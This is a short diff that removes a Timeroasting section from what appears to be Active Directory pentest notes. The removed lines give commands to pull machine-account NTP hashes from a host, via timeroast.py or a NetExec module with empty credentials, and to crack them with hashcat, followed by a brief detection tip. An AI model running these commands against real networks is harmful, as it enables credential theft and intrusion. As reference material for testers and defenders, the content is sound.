@@ -31,17 +31,3 @@ sequenceDiagram
 
 ### Commands
 ```bash
-# ── Extract hashes ──────────────────────────────────────────────────
-sudo ./timeroast.py 10.0.10.5 | tee ntp.txt
-
-# ── Or NetExec module ────────────────────────────────────────────────
-nxc smb 10.0.10.5 -u '' -p '' -M timeroast
-
-# ── Crack ────────────────────────────────────────────────────────────
-hashcat -m 31300 ntp.txt rockyou.txt
-```
-
-### Detection
-NTP requests from non-DC hosts with malformed/auth extensions; monitor **UDP 123**; rotate machine passwords (default 30 days helps).
-
----
